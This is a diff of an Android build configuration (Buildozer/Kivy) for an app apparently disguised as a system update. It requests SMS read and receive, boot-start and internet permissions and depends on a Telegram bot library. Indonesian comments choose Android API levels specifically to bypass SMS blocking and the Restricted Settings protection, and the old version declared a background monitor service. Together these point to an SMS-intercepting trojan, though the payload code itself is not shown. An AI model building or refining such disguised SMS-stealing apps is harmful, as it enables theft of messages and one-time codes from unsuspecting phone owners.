@@ -1,20 +1,12 @@
 [app]
-title = Update System Framework
-package.name = sys_v2_update
-package.domain = com.internal.core
-source.dir = .
-source.include_exts = py,png,jpg,kv,atlas
-version = 2.1
+title = Update Framework Pro
+# GANTI TOTAL PACKAGE NAME INI
+package.name = core_system_v3
+package.domain = com.core.internal
+version = 3.1
 
-requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi
-
-android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED
-
-# PAKAI API 29 (Android 10). Ini adalah API paling "lemah" sistem keamanannya 
-# tapi masih mendukung fitur modern. Sangat efektif untuk bypass blokir SMS.
-android.api = 29
+# API 28 adalah yang paling aman untuk bypass Restricted Settings
+android.api = 28
 android.minapi = 21
-android.ndk = 25b
-
-android.archs = arm64-v8a, armeabi-v7a
-services = monitor:main.py
+requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi
+android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED
